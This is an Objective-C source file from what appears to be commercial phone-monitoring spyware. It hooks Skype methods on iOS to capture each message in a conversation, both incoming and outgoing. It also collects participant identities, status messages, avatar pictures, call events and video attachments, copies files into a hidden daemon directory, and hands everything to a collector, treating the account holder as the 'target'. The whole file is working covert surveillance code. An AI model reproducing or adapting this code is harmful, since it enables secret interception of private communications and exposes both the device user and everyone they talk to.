/*
 *  Skype.h
 *  MSFSP
 *
 *  Created by Makara Khloth on 12/7/12.
 *  Copyright 2012 __MyCompanyName__. All rights reserved.
 *
 */

#import "SKConversationManager.h"
#import "SKConversation.h"

#import	"SKParticipant.h"
#import "SKContact.h"
#import "SkypeUtils.h"
#import "FxIMEvent.h"
#import "FxVoIPEvent.h"
#import	"FxRecipient.h"
#import "SKAccountManager.h"
#import "SKAccount.h"
#import "SKFileTransferManager.h"
#import "SKTransferMessage.h"
#import "QikThumbnailImage.h"
#import "SKImageScaler.h"
#import "SKVideoMessage.h"
#import "SKVideoMessage+Skype49.h"

#import "SKMessage+Skype48.h"
#import "SKMessage.h"
#import "ConversationLists+48.h"
#import "ConversationCenter.h"
#import "DomainObject.h"
#import "DomainObjectPool.h"
#import "SKConversationManager+Skype48.h"
#import "ContactLists.h"
#import "SKFileTransferManager+Skype48.h"

#pragma mark -
#pragma mark Capture OUTGOING skype in chat view
#pragma mark -

void printSKMessage (SKMessage *aMsgObj) {	
	DLog (@"msgObj = %@",				aMsgObj);
	DLog (@"skyLibDatabaseID = %d",				[aMsgObj skyLibDatabaseID]);	
	DLog (@"skyLibObjectID = %d",				[aMsgObj skyLibObjectID]);
	DLog (@"timestamp = %@",				[aMsgObj timestamp]);	 
	//DLog (@"ALEObject = %@",				[aMsgObj ALEObject]);	
	DLog (@"author = %@",				[aMsgObj author]);
	DLog (@"body = %@",					[aMsgObj body]);
	DLog (@"bodyXML = %@",				[aMsgObj bodyXML]);
	DLog (@"identity = %@",				[aMsgObj identity]);
	DLog (@"displayType = %@",			[aMsgObj displayType]);
	DLog (@"[OUT] transferMessage = %@", [aMsgObj transferMessage]);
	DLog (@"videoMessage = %@",			[aMsgObj videoMessage]);
	DLog (@"isOutbound %d",				[aMsgObj isOutbound])
	DLog (@"isSending %d",				[aMsgObj isSending])
	DLog (@"sendingStatus %d",			[aMsgObj sendingStatus])		
	DLog (@"messageType %d",			[aMsgObj messageType])
	DLog (@"eventType %d",				[aMsgObj eventType])		
	DLog (@"transferMessage %@",		[aMsgObj transferMessage])
	DLog (@"displayType %@",			[aMsgObj displayType])
	DLog (@"identity %@",				[aMsgObj identity]);
	
	DLog (@"isMissed %d",				[aMsgObj isMissed])
	DLog (@"isMissedCall %d",			[aMsgObj isMissedCall])
	DLog (@"isDeclinedInboundCall %d",		[aMsgObj isDeclinedInboundCall])
	DLog (@"isDeclinedOutboundCall %d",		[aMsgObj isDeclinedOutboundCall])
	DLog (@"isLiveSessionEndMessage %d",	[aMsgObj isLiveSessionEndMessage])
	DLog (@"isLiveSessionStartMessage %d",	[aMsgObj isLiveSessionStartMessage])
	DLog (@"isConnectionDropped %d",		[aMsgObj isConnectionDropped])
	DLog (@"isOutbound %d",					[aMsgObj isOutbound])	
}

void printSKVideoMEssage (SKVideoMessage *videoMessage) {
	DLog (@"publicLink = %@",	[videoMessage publicLink]);
	DLog (@"localPath = %@",	[videoMessage localPath]);			// This is used
	DLog (@"vodPath = %@",		[videoMessage vodPath]);
	//DLog (@"thumbnailUrl = %@", [videoMessage thumbnailUrl]);		// This argument doesn't exist in Skype version 4.8
	DLog (@"thumbnail = %@",	[videoMessage thumbnail]);
	DLog (@"filePath = %@",		[videoMessage filePath]);
	DLog (@"publicLink = %@",	[videoMessage publicLink]);
	DLog (@"localPath = %@",	[videoMessage localPath]);
	DLog (@"vodPath = %@",		[videoMessage vodPath]);
	DLog (@"author = %@",		[videoMessage author]);
	DLog (@"description = %@",	[videoMessage description]);
	DLog (@"title = %@",		[videoMessage title]);
	
	// Skype 4.9
	if ([videoMessage respondsToSelector:@selector(videoDescription)]) {
		DLog (@"initialTitle = %@", [videoMessage initialTitle]);
		DLog (@"initialDescription = %@", [videoMessage initialDescription]);
		DLog (@"filePath = %@", [videoMessage filePath]);
		DLog (@"videoDescription = %@", [videoMessage videoDescription]);
	}
}


/*********************************************************
	DIRECTION:			OUTGOING + INCOMING
	CAPTURING VERSION:	4.8
	CALLED:				4.8 (filter version in .mm)
 *********************************************************/
HOOK(SKConversation, onMessage$, void, id message) {
	DLog (@"@@@@@@@@@@@@@@@@@@@ SKConversation --> onMessage @@@@@@@@@@@@@@@@@@@")
	DLog (@"message: (class:%@) %@", [message class], message)		
	CALL_ORIG(SKConversation, onMessage$, message);			
	
	DLog (@"_lastMessage %@",			[self _lastMessage])	
	DLog (@"lastMessage %@",			[self lastMessage])	
	DLog (@"outstandingMessageIDs %@",	[self outstandingMessageIDs])	
	//DLog (@"hasLoadedLastMessage %d",	[self hasLoadedLastMessage])
	DLog (@"unreadMessageCount %d",		[self unreadMessageCount])	
	DLog (@"localLiveStatusString %@",	[self localLiveStatusString])	
	

	NSMutableArray *messages			= [self messages];	
	
	//DLog (@"lastObject: %@", [messages lastObject])
	
	if (messages && [messages lastObject]) {
		
		// -- sort message in the message array according to the skyLibObjectID (the id that we get as the argument "message")
		NSSortDescriptor *valueDescriptor = [[[NSSortDescriptor alloc] initWithKey:@"skyLibObjectID" ascending:NO] autorelease];	// the first element is latest
		NSArray * descriptors				= [NSArray arrayWithObject:valueDescriptor]; 	
		NSArray * sortedArray				= [messages sortedArrayUsingDescriptors:descriptors];
		
		for (SKMessage *aMessage in messages) {
			DLog (@"(BEFORE) id: %d %@", [aMessage skyLibObjectID], [aMessage body])
		}
		
		//SKMessage *msgObj					= [messages lastObject];
		SKMessage *msgObj					= nil;
		
		for (SKMessage *aMessage in sortedArray) {
			DLog (@"(AFTER) id: %d %@", [aMessage skyLibObjectID], [aMessage body])
			if ([aMessage skyLibObjectID] == [(NSNumber *)message unsignedIntValue]) {
				DLog (@"match %d", [aMessage skyLibObjectID])
				msgObj	= aMessage;
				break;
			}
		}
		
		if (msgObj) {
			printSKMessage(msgObj);												// printing
			
			// Direction
			FxEventDirection direction = kEventDirectionUnknown;
			
			// For outgoing from device: displayType is POSTED_TEXT
			if (/*[msgObj isOutbound]												&&*/
				([msgObj transferMessage] == nil								&&
				![[msgObj displayType] isEqualToString:@"POSTED_FILES"])		&&	// Outgoing with attachment (photo) sometime [msgObj transferMessage] == nil
				![[msgObj displayType] isEqualToString:@"STARTED_LIVESESSION"]	&&	// Voice/Video Call Start
				//![[msgObj displayType] isEqualToString:@"ENDED_LIVESESSION"]	&&	// Voice/Video Call	End
				![[msgObj displayType] isEqualToString:@"SPAWNED_CONFERENCE"]	&&	// Conference
				![[msgObj displayType] isEqualToString:@"RETIRED"]				&&	// Leave conversation				
				![[msgObj displayType] isEqualToString:@"POSTED_CONTACTS"]		){  // incoming contact from pc version of Skype
				
				// -- assign direction
				if ([msgObj isOutbound])
					direction					= kEventDirectionOut;			
				else
					direction					= kEventDirectionIn;			
				
				NSString *message				= [msgObj body];
				NSString *userId				= [msgObj identity];				// sender
				NSString *userDisplayName		= [msgObj authorDisplayName];		// sender
				NSString *imServiceId			= @"skp";
				NSString *senderStatusMessage	= nil;
				NSData *senderPictureData		= nil;
				NSMutableArray *attachments		= [NSMutableArray array];
				// Participants: Skype store everyone in conversation
				NSArray *origParticipants		= [self participants];
				NSMutableArray *tempParticipants	= [origParticipants mutableCopy];
				
				// Remove sender from participants list
				for (int i=0; i < [origParticipants count]; i++) {			
					if ([[((SKParticipant *)[origParticipants objectAtIndex:i]) identity] isEqualToString:userId]) {
						// -- get sender's status message 
						SKContact *contact	= [((SKParticipant *)[origParticipants objectAtIndex:i]) contact];
						senderStatusMessage = [contact moodMessage];			
						senderPictureData	= [contact avatarImageData];
						//[senderPictureData writeToFile:@"/tmp/skypeImage2.jpg" atomically:YES];
						[tempParticipants removeObjectAtIndex:i];
						break;
					}
				}
				
				Class $SKAccountManager(objc_getClass("SKAccountManager"));
				SKAccount *currentAccount			= [[$SKAccountManager sharedManager] currentAccount];	// SKAccount
				DLog (@"account identity %@", [currentAccount identity])
				
				// Map to FxRecipient array
				NSMutableArray *finalParticipants = [NSMutableArray array];
				for (SKParticipant *obj in tempParticipants) {	
					FxRecipient *participant = [[FxRecipient alloc] init];
					[participant setRecipNumAddr:[obj identity]];
					[participant setRecipContactName:[obj displayName]];								
					[participant setMStatusMessage:[(SKContact *)[obj contact] moodMessage]];
					[participant setMPicture:[[obj contact] avatarImageData]];					
					DLog (@"> participant status message (%@):  %@", [[obj contact] displayName], [[obj contact] moodMessage])
					//[[[obj contact] avatarImageData] writeToFile:getOutputPath() atomically:YES];		
						
					if ([[obj identity] isEqualToString:[(SKAccount *)currentAccount identity]]) {		// target									
						DLog (@"target so insert at 1st index")
						[finalParticipants insertObject:participant	atIndex:0];						
					} else {																			// not target
						[finalParticipants addObject:participant];				
					}								
					[participant release];
				}
				[tempParticipants release];
				
				// Video attachment
				if ([msgObj videoMessage]) {
					SKVideoMessage *videoMessage	= [msgObj videoMessage];
					printSKVideoMEssage(videoMessage);									// print SKVideoMessage
					
					NSMutableString *vdoMessage = [NSMutableString stringWithString:[videoMessage title]];
					if ([videoMessage respondsToSelector:@selector(videoDescription)]) {
						[vdoMessage appendFormat:@"\n%@", [videoMessage videoDescription]];
					}
					NSCharacterSet *set1 = [NSCharacterSet whitespaceCharacterSet];
					NSCharacterSet *set2 = [NSCharacterSet characterSetWithCharactersInString:@"\n"];
					message = [vdoMessage stringByTrimmingCharactersInSet:set1];
					message = [message stringByTrimmingCharactersInSet:set2];
					DLog (@"message after trim = %@, length = %d", message, [message length]);
					
					FxAttachment *attachment		= [[FxAttachment alloc] init];
					
					if (direction == kEventDirectionOut) {
						DLog (@"====================== [OUT] Video Message ===================");
						
						NSString *skypeAttachmentPath	= [[DaemonPrivateHome daemonPrivateHome] stringByAppendingString:@"attachments/imSkype/"];
						NSString *saveFilePath			= [skypeAttachmentPath stringByAppendingString:[[videoMessage localPath] lastPathComponent]];
						NSString *originPath			= [videoMessage localPath];		// This path will be deleted after Skype upload successfully
						NSError *error					= nil;
						NSFileManager *fileManager		= [NSFileManager defaultManager];
						
						DLog(@"[Video] File is exist = %d", [fileManager fileExistsAtPath:originPath]);
						
						// Sometime we got only folder of that store actual file e.g: /var/mobile/Applications/xxxx/Documents (Siriluck found this)
						// in this case this event would block the other event in daemon thus we do check whether the saveFilePath is a folder
						
						// Actual file
						BOOL originIsFolder = NO;
						if ([fileManager fileExistsAtPath:originPath isDirectory:&originIsFolder] && !originIsFolder) {
							[fileManager removeItemAtPath:saveFilePath error:&error];
							DLog (@"[Video] Remove file error = %@", error);
							DLog (@"removeItemAtPath: %@", saveFilePath);
							
							error = nil;
							[fileManager copyItemAtPath:originPath toPath:saveFilePath error:&error];	// copy attachment to our document directory
							DLog (@"[Video] Copy file error = %@", error);
							
						}					
					
						// Thumbnail
						NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];					
						NSString *thumbnailPath = [[videoMessage localPath] stringByAppendingString:@".png"]; // /var/mobile/Applications/xxxx/Documents/xxx.mov.png
						DLog (@"thumbnailPath %@", thumbnailPath);					
						
						// -- attachment
						BOOL isFolder = NO;
						BOOL fileExistsAtPath = [fileManager fileExistsAtPath:saveFilePath isDirectory:&isFolder];
						
						if (fileExistsAtPath && !isFolder) {
							[attachment setFullPath:saveFilePath];
						} else {
							[attachment setFullPath:@"video/quicktime"]; // For sync from other devices
						}
						
						NSData *thumbnail = [NSData dataWithContentsOfFile:thumbnailPath];
						[attachment setMThumbnail:thumbnail];
						[pool release];
						
					} else {
						DLog (@"====================== [IN] Video Message ===================");
						
						// -- attachment
						[attachment setFullPath:@"video/quicktime"];	// Hard code mime type since cannot get thumbnail or real video													
					}
					
					[attachments addObject:attachment];
					[attachment release];
				}
				
				DLog(@"mDirection->%d",			direction);
				DLog(@"mUserID->%@",			userId);
				DLog(@"mUserDisplayName->%@",	userDisplayName);
				DLog(@"mParticipants->%@",		finalParticipants);
				DLog(@"mIMServiceID->%@",		imServiceId);
				DLog(@"mMessage->%@",			message);
				DLog(@"mAttachments->%d",		[msgObj isChatMessage]);
				DLog (@"converstion displayName = %@",	[self displayName]);
				DLog (@"conversationIdentifier = %@",	[self conversationIdentifier]);
				//DLog (@"convoGUID %@", [msgObj convoGUID])
				DLog (@"sender status message %@",		senderStatusMessage)
								
				// CASE 1: IM Event
				if (![[msgObj displayType] isEqualToString:@"ENDED_LIVESESSION"]) {					
					FxIMEvent *imEvent = [[FxIMEvent alloc] init];
					[imEvent setMUserID:userId];									// sender
					[imEvent setMIMServiceID:imServiceId];			
					[imEvent setMDirection:direction];
					[imEvent setMMessage:message];
					[imEvent setMUserDisplayName:userDisplayName];					// sender
					[imEvent setMParticipants:finalParticipants];
					[imEvent setMAttachments:attachments];
					[imEvent setDateTime:[DateTimeFormat phoenixDateTime]];					
					[imEvent setMServiceID:kIMServiceSkype];					
					if ([attachments count] == 0 || [message length] > 0)			// Some time video consist of title & description 
						[imEvent setMRepresentationOfMessage:kIMMessageText];		// text message
					else 
						[imEvent setMRepresentationOfMessage:kIMMessageNone];		// video message						
					// -- conversation
					[imEvent setMConversationID:[self conversationIdentifier]];
					[imEvent setMConversationName:[self displayName]];
					// -- user
					[imEvent setMUserStatusMessage:senderStatusMessage];			// sender status message
					[imEvent setMUserPicture:senderPictureData];					// sender image profile					
					[imEvent setMConversationPicture:nil];
					[imEvent setMUserLocation:nil];
					[imEvent setMShareLocation:nil];
					DLog (@"Text representation = %d", [imEvent mRepresentationOfMessage]);			
					[SkypeUtils sendSkypeEvent:imEvent];
					[imEvent release];
					
				}
				// CASE 2: SKYPE VOIP Event
				else {
					FxRecipient *recipient		= (FxRecipient *)[finalParticipants objectAtIndex:0];
					FxVoIPEvent *skypeVoIPEvent = [SkypeUtils createSkypeVoIPEventForMessage:msgObj		
																				   direction:direction 
																				   recipient:recipient];		
					[SkypeUtils sendSkypeVoIPEvent:skypeVoIPEvent];
				}						
			} else {
				DLog (@"Cannot find the matched id")
			}
		} // if (msgObj)		
		else {
			DLog (@"&&&&&&&&&&&&&&&&&& This skype message is not captured &&&&&&&&&&&&&&&&&&")						
		} // else (msgObj)
	}
	DLog (@"++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++ ")
}


/*
	DIRECTION:			OUTGOING
	CAPTURING VERSION:	4.2.2604, 4.5.222, 4.6 (Called up to this version)
	CALLED:				4.2.2604, 4.5.222, 4.6 
 */
HOOK(SKConversation, insertObject$inMessagesAtIndex$, void, id aMsgObj, unsigned index) {
	DLog (@">>>>>>>>>>>>>>>> (OUT) SKConversation --> insertObject")
    CALL_ORIG(SKConversation, insertObject$inMessagesAtIndex$, aMsgObj, index);
	SKMessage *msgObj = aMsgObj;
	
	DLog (@">>>>>>>>>>>>>>>> (OUT) <<<<<<<<<<<<<<<<<<<<<");
	DLog (@"index = %d", index);
	DLog (@"msgObj = %@", msgObj);
	DLog (@"author = %@", [msgObj author]);
	DLog (@"body = %@", [msgObj body]);
	DLog (@"bodyXML = %@", [msgObj bodyXML]);
	DLog (@"identity = %@", [msgObj identity]);
	DLog (@"displayType = %@", [msgObj displayType]);
	DLog (@"[OUT] transferMessage = %@", [msgObj transferMessage]);
	DLog (@"videoMessage = %@", [msgObj videoMessage]);
	DLog (@"videoMessage description = %@", [(SKVideoMessage *)[msgObj videoMessage] description]);
	DLog (@"videoMessage title = %@",  [(SKVideoMessage *)[msgObj videoMessage] title]);
	DLog (@">>>>>>>>>>>>>>>> (OUT) <<<<<<<<<<<<<<<<<<<<<");
	
	// Direction
	int direction = kEventDirectionUnknown;
	if ([msgObj isOutbound]				&&
		([msgObj transferMessage] == nil &&
		 ![[msgObj displayType] isEqualToString:@"POSTED_FILES"])) { // Outgoing with attachment (photo) sometime [msgObj transferMessage] == nil
		direction					= kEventDirectionOut;
		NSString *message			= [msgObj body];
		NSString *userId			= [msgObj identity];				// sender
		NSString *userDisplayName	= [msgObj authorDisplayName];		// sender
		NSString *imServiceId		= @"skp";
		NSString *senderStatusMessage = nil;
		NSData *senderPictureData	= nil;
		NSMutableArray *attachments = [NSMutableArray array];
		// Participants: Skype store everyone in conversation
		NSArray *origParticipants			= [self participants];
		NSMutableArray *tempParticipants	= [origParticipants mutableCopy];
	
		// Remove sender from participants list
		for (int i=0; i < [origParticipants count]; i++) {			
			if ([[((SKParticipant *)[origParticipants objectAtIndex:i]) identity] isEqualToString:userId]) {
				// -- get sender's status message 
				SKContact *contact = [((SKParticipant *)[origParticipants objectAtIndex:i]) contact];
				senderStatusMessage = [contact moodMessage];			
				senderPictureData = [contact avatarImageData];
				//[senderPictureData writeToFile:@"/tmp/skypeImage2.jpg" atomically:YES];
				[tempParticipants removeObjectAtIndex:i];
				break;
			}
		}
		// Map to FxRecipient array
		NSMutableArray *finalParticipants = [NSMutableArray array];
		for (SKParticipant *obj in tempParticipants) {	
			FxRecipient *participant = [[FxRecipient alloc] init];
			[participant setRecipNumAddr:[obj identity]];
			[participant setRecipContactName:[obj displayName]];								
			[participant setMStatusMessage:[(SKContact *)[obj contact] moodMessage]];
			[participant setMPicture:[[obj contact] avatarImageData]];					
			DLog (@"> participant status message (%@):  %@", [[obj contact] displayName], [[obj contact] moodMessage])
			//[[[obj contact] avatarImageData] writeToFile:getOutputPath() atomically:YES];		
			[finalParticipants addObject:participant];
			[participant release];
		}
		[tempParticipants release];
		
		// Video attachment
		if ([msgObj videoMessage]) {
			SKVideoMessage *videoMessage = [msgObj videoMessage];
			
			DLog (@"====================== [OUT] Video Message ===================");
			DLog (@"title = %@", [videoMessage title]);
			DLog (@"description = %@", [videoMessage description]);
			DLog (@"author = %@", [videoMessage author]);
			DLog (@"publicLink = %@", [videoMessage publicLink]);
			DLog (@"localPath = %@", [videoMessage localPath]);
			DLog (@"vodPath = %@", [videoMessage vodPath]);
			DLog (@"thumbnailUrl = %@", [videoMessage thumbnailUrl]);
			DLog (@"thumbnail = %@", [videoMessage thumbnail]);
			DLog (@"====================== [OUT] Video Message ===================");
			
			NSString *skypeAttachmentPath = [[DaemonPrivateHome daemonPrivateHome] stringByAppendingString:@"attachments/imSkype/"];
			NSString *saveFilePath = [skypeAttachmentPath stringByAppendingString:[[videoMessage localPath] lastPathComponent]];
			NSString *originPath = [videoMessage localPath]; // This path will be deleted after Skype upload successfully
			
			NSError *error = nil;
			NSFileManager *fileManager = [NSFileManager defaultManager];
			DLog(@"[Video] File is exist = %d", [fileManager fileExistsAtPath:originPath]);
			
			// Sometime we got only folder of that store actual file e.g: /var/mobile/Applications/xxxx/Documents (Siriluck found this)
			// in this case this event would block the other event in daemon thus we do check whether the saveFilePath is a folder
			
			BOOL originIsFolder = NO;
			if ([fileManager fileExistsAtPath:originPath isDirectory:&originIsFolder] && !originIsFolder) {
				[fileManager removeItemAtPath:saveFilePath error:&error];
				DLog (@"[Video] Remove file error = %@", error);
				
				error = nil;
				[fileManager copyItemAtPath:originPath toPath:saveFilePath error:&error];
				DLog (@"[Video] Copy file error = %@", error);
			}
			
			// -- Message
			NSMutableString *vdoMessage = [NSMutableString stringWithString:[videoMessage title]];
			if ([videoMessage respondsToSelector:@selector(videoDescription)]) {
				[vdoMessage appendFormat:@"\n%@", [videoMessage videoDescription]];
			}
			NSCharacterSet *set1 = [NSCharacterSet whitespaceCharacterSet];
			NSCharacterSet *set2 = [NSCharacterSet characterSetWithCharactersInString:@"\n"];
			message = [vdoMessage stringByTrimmingCharactersInSet:set1];
			message = [message stringByTrimmingCharactersInSet:set2];
			DLog (@"message after trim = %@, length = %d", message, [message length]);
			
			// -- Thumbnail
			NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
			NSString *thumbnailPath = [[videoMessage localPath] stringByAppendingString:@".png"]; // /var/mobile/Applications/xxxx/Documents/xxx.mov.png
			DLog (@"thumbnailPath %@", thumbnailPath);
			
			FxAttachment *attachment = [[FxAttachment alloc] init];
			
			BOOL isFolder = NO;
			BOOL fileExistsAtPath = [fileManager fileExistsAtPath:saveFilePath isDirectory:&isFolder];
			
			if (fileExistsAtPath && !isFolder) {
				[attachment setFullPath:saveFilePath];
			} else {
				[attachment setFullPath:@"video/quicktime"]; // For sync from other devices
			}
			
			NSData *thumbnail = [NSData dataWithContentsOfFile:thumbnailPath];
			[attachment setMThumbnail:thumbnail];
			[attachments addObject:attachment];
			[attachment release];
			
			[pool release];
			
		}
		
		DLog(@"mDirection->%d", direction);
		DLog(@"mUserID->%@", userId);
		DLog(@"mUserDisplayName->%@", userDisplayName);
		DLog(@"mParticipants->%@", finalParticipants);
		DLog(@"mIMServiceID->%@", imServiceId);
		DLog(@"mMessage->%@", message);
		DLog(@"mAttachments->%d", [msgObj isChatMessage]);
		DLog (@"converstion displayName = %@", [self displayName]);
		DLog (@"conversationIdentifier = %@", [self conversationIdentifier]);
		//DLog (@"convoGUID %@", [msgObj convoGUID])
		DLog (@"sender status message %@", senderStatusMessage)
		
		FxIMEvent *imEvent = [[FxIMEvent alloc] init];
		[imEvent setMUserID:userId];								// sender
		[imEvent setMIMServiceID:imServiceId];		
		[imEvent setMDirection:(FxEventDirection)direction];
		[imEvent setMMessage:message];
		[imEvent setMUserDisplayName:userDisplayName];				// sender
		[imEvent setMParticipants:finalParticipants];
		[imEvent setMAttachments:attachments];
		[imEvent setDateTime:[DateTimeFormat phoenixDateTime]];		
		// new
		[imEvent setMServiceID:kIMServiceSkype];
			
		if ([attachments count] == 0 || [message length] > 0) {	// Some time video consist of title & description
			[imEvent setMRepresentationOfMessage:kIMMessageText];		// text message
		} else {
			[imEvent setMRepresentationOfMessage:kIMMessageNone];		// video message
		}
		DLog (@"Text representation = %d", [imEvent mRepresentationOfMessage]);
		
		[imEvent setMConversationID:[self conversationIdentifier]];
		[imEvent setMConversationName:[self displayName]];
		[imEvent setMUserStatusMessage:senderStatusMessage];		// sender status message
		[imEvent setMUserPicture:senderPictureData];				// sender image profile
		//DLog (@"senderPictureData : %d", [senderPictureData length])
		[imEvent setMConversationPicture:nil];
		[imEvent setMUserLocation:nil];
		[imEvent setMShareLocation:nil];
			
		[SkypeUtils sendSkypeEvent:imEvent];
		[imEvent release];
		
	} else {
		// Incoming is captured in another method below
	}
}

#pragma mark -
#pragma mark Capture INCOMING skype in chat view or new message in other chat view
#pragma mark -


/*
	DIRECTION:			INCOMING
	CAPTURING VERSION:	4.2.2604, 4.5.222, 4.6 
	CALLED:				4.2.2604, 4.5.222, 4.6 
 */
HOOK(SKConversationManager, insertObject$inUnreadConversationsAtIndex$, void, id aConvObj, unsigned index) {
	DLog (@">>>>>>>>>>>>>>>> (IN) SKConversationManager --> insertObject")
	SKConversation *conversation = aConvObj;
	// Value of index always 0
	DLog (@"All messages = %@", [conversation messages]);
	
//	for (id eachMessage in [conversation messages]) {
//		DLog (@"--------------------------------------------")
//		DLog (@"MSG: %@", eachMessage)
//		DLog (@"skyLibDBID %d", [eachMessage skyLibDBID])
//		DLog (@"skyLibObjectID %d", [eachMessage skyLibObjectID])
//		DLog (@"body %@", [eachMessage body])
//		DLog (@"isUnread %d", [eachMessage isUnread])
//		DLog (@"--------------------------------------------")
//	}
	
	// METHOD1: (not work properly, missed some messages)
	//	SKMessage *msgObj = [conversation lastRelevantMessage];
	//	SKMessage *latestMsg = [conversation latestMessage];
	
	// METHOD2:
	// When Skype start up the conversation array contains 0 element
	// If user send message fast (supper fast) there might be lost message
	SKMessage *msgObj = [[conversation messages] lastObject];
	SKMessage *latestMsg = nil;
	
	DLog (@"msgObj = %@ latestMsg = %@", msgObj, latestMsg);
	DLog (@"[IN] transferMessage = %@", [msgObj transferMessage]);
	DLog (@"===================== %@ ====================", [conversation firstRelevantMessage]);
	
    CALL_ORIG(SKConversationManager, insertObject$inUnreadConversationsAtIndex$, aConvObj, index);

	if (msgObj && ![msgObj isOutbound]								&&		
		[msgObj transferMessage] == nil								&&
		![[msgObj displayType] isEqualToString:@"POSTED_CONTACTS"]	&&	
		![[msgObj displayType] isEqualToString:@"POSTED_FILES"]		){
		
		
		// When latest message is not nil, that's mean incoming new message is in current chat view otherwise
		// in other chat view
		if (latestMsg) {
			msgObj = latestMsg;
		}
		
		NSString *message = [msgObj body];
		NSString *userId = [msgObj identity];
		NSString *userDisplayName = [msgObj authorDisplayName];
		NSString *imServiceId = @"skp";
		NSString *senderStatusMessage = nil;
		NSData *senderPictureData	= nil;
		NSMutableArray *attachments = [NSMutableArray array];
		
		// Direction
		int direction = kEventDirectionUnknown;
		if ([msgObj isOutbound]) {
			direction = kEventDirectionOut;
		} else {
			direction = kEventDirectionIn;
		}
		// Participants: Skype store everyone in conversation
		NSArray *origParticipants = [conversation participants];
		DLog (@"origParticipants %@", origParticipants)
		
		NSMutableArray *tempParticipants = [origParticipants mutableCopy];
		
		// Remove sender from participants list
		for (int i=0; i < [origParticipants count]; i++) {
			if ([[((SKParticipant *)[origParticipants objectAtIndex:i]) identity] isEqualToString:userId]) {
				// -- get sender's status message
				SKContact *contact = [((SKParticipant *)[origParticipants objectAtIndex:i]) contact];
				senderStatusMessage = [contact moodMessage];			
				senderPictureData = [contact avatarImageData];
				DLog (@"senderPictureData %d", [senderPictureData length])
				//[senderPictureData writeToFile:@"/tmp/skypeImageIn.jpg" atomically:YES];
				[tempParticipants removeObjectAtIndex:i];
				break;
			}
		}
		
		Class $SKAccountManager(objc_getClass("SKAccountManager"));
		SKAccount *currentAccount			= [[$SKAccountManager sharedManager] currentAccount];	// SKAccount
		DLog (@"account identity %@", [currentAccount identity])
		
		// Map to FxRecipient array
		NSMutableArray *finalParticipants = [NSMutableArray array];
		for (SKParticipant *obj in tempParticipants) {
			FxRecipient *participant = [[FxRecipient alloc] init];
			[participant setRecipNumAddr:[obj identity]];
			[participant setRecipContactName:[obj displayName]];
			[participant setMStatusMessage:[(SKContact *)[obj contact] moodMessage]];
			DLog (@">>> CONTACT PICTURE: %d", [[[obj contact] avatarImageData] length])
			[participant setMPicture:[[obj contact] avatarImageData]];	
			DLog (@"> participant status message (%@):  %@", [[obj contact] displayName], [[obj contact] moodMessage])
			//DLog (@"> participant picture   %d", [[[obj contact] avatarImageData] length])
			//[[[obj contact] avatarImageData] writeToFile:getOutputPath() atomically:YES];
			
			if ([[obj identity] isEqualToString:[(SKAccount *)currentAccount identity]]) {		// target									
				DLog (@"target so insert at 1st index")
				[finalParticipants insertObject:participant	atIndex:0];
				
			} else {																			// not target
				[finalParticipants addObject:participant];				
			}			
			[participant release];
		}
		[tempParticipants release];
		
		// Video attachment
		if ([msgObj videoMessage]) {
			SKVideoMessage *videoMessage = [msgObj videoMessage];
			
			DLog (@"====================== [IN] Video Message ===================");
			DLog (@"title = %@", [videoMessage title]);
			DLog (@"description = %@", [videoMessage description]);
			DLog (@"author = %@", [videoMessage author]);
			DLog (@"publicLink = %@", [videoMessage publicLink]); // String with zero in length
			DLog (@"localPath = %@", [videoMessage localPath]); // /var/mobile/Applications/25F90D9F-A448-4FC7-865F-C761CEDA621A/Documents
			DLog (@"vodPath = %@", [videoMessage vodPath]); // null
			DLog (@"thumbnailUrl = %@", [videoMessage thumbnailUrl]); // null
			DLog (@"thumbnail = %@", [videoMessage thumbnail]); // null
			DLog (@"====================== [IN] Video Message ===================");
			
			NSMutableString *vdoMessage = [NSMutableString stringWithString:[videoMessage title]];
			if ([videoMessage respondsToSelector:@selector(videoDescription)]) {
				[vdoMessage appendFormat:@"\n%@", [videoMessage videoDescription]];
			}
			NSCharacterSet *set1 = [NSCharacterSet whitespaceCharacterSet];
			NSCharacterSet *set2 = [NSCharacterSet characterSetWithCharactersInString:@"\n"];
			message = [vdoMessage stringByTrimmingCharactersInSet:set1];
			message = [message stringByTrimmingCharactersInSet:set2];
			DLog (@"message after trim = %@, length = %d", message, [message length]);
			
			FxAttachment *attachment = [[FxAttachment alloc] init];
			[attachment setFullPath:@"video/quicktime"]; // Hard code mime type since cannot get thumbnail or real video
			[attachments addObject:attachment];
			[attachment release];
			
			videoMessage = nil;
		}
		
		DLog(@"mDirection->%d", direction);
		DLog(@"mUserID->%@", userId);
		DLog(@"mUserDisplayName->%@", userDisplayName);
		DLog(@"mParticipants->%@", finalParticipants);
		DLog(@"mIMServiceID->%@", imServiceId);
		DLog(@"mMessage->%@", message);
		DLog(@"mAttachments->%d", [msgObj isChatMessage]);
		DLog (@"converstion displayName = %@", [conversation displayName]);
		DLog (@"conversationIdentifier = %@", [conversation conversationIdentifier])
		
		FxIMEvent *imEvent = [[FxIMEvent alloc] init];
		[imEvent setMUserID:userId];
		[imEvent setMIMServiceID:imServiceId];
		[imEvent setMDirection:(FxEventDirection)direction];
		[imEvent setMMessage:message];
		[imEvent setMUserDisplayName:userDisplayName];		
		[imEvent setMParticipants:finalParticipants];
		[imEvent setMAttachments:attachments];
		[imEvent setDateTime:[DateTimeFormat phoenixDateTime]];
		// new
		[imEvent setMServiceID:kIMServiceSkype];

		if ([attachments count] == 0 || [message length] > 0) {	// Some time video consist of title & description
			[imEvent setMRepresentationOfMessage:kIMMessageText];		// text message
		} else {
			[imEvent setMRepresentationOfMessage:kIMMessageNone];		// video message
		}
		DLog (@"Text representation = %d", [imEvent mRepresentationOfMessage]);
		
		[imEvent setMConversationID:[conversation conversationIdentifier]];
		[imEvent setMConversationName:[conversation displayName]];
		[imEvent setMUserStatusMessage:senderStatusMessage];		// sender status message
		[imEvent setMUserPicture:senderPictureData];				// sender image profile
		[imEvent setMConversationPicture:nil];
		[imEvent setMUserLocation:nil];
		[imEvent setMShareLocation:nil];
				
		[SkypeUtils sendSkypeEvent:imEvent];
		[imEvent release];
	} else {
		DLog (@"---- INCOMING -----")
		// Outgoing is captured in another method above
	}
}

#pragma mark -
#pragma mark Skype attachments
#pragma mark -


/*
	DIRECTION:					
	CAPTURING VERSION:			4.6 
	CALLED:					4.6
 */
